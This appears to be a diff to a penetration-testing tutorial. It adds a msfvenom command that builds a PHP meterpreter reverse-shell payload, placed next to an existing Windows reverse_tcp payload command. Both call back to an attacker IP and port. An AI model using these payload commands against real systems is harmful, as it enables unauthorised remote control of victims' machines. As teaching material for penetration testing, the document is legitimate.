@@ -28,6 +28,15 @@ Here we create a program that will call the attacker machine.
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe > payload.exe
 ```
 
+We can also create reverse-shells in various languages
+
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f raw > windowsshell.php
+```
+
+One mistake I have done several times has been to accidentally leave in the `--payloads-options`, this ruins the whole payload and the shell won't work.
+
+
 ## Start listening for exploit
 
 So once an exploit is set we need to start to listen for it. We can do that using metasploit.
